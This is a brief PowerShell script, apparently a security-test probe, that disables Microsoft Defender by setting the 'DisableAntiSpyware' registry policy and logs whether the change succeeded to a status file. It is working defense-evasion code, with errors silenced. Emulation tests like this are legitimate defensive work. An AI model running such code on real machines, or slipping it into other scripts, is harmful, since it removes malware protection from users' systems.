param()

$ErrorActionPreference = 'SilentlyContinue'
$statusPath = 'C:\\F0\\status.txt'

function Write-Status($msg) {
    try { Set-Content -Path $statusPath -Value $msg -Encoding UTF8 } catch {}
}

try {
    New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Force | Out-Null
    New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -PropertyType DWord -Force | Out-Null
    Write-Status 'DEFENDER_DISABLED'
} catch {
    Write-Status 'ACCESS_DENIED'
}

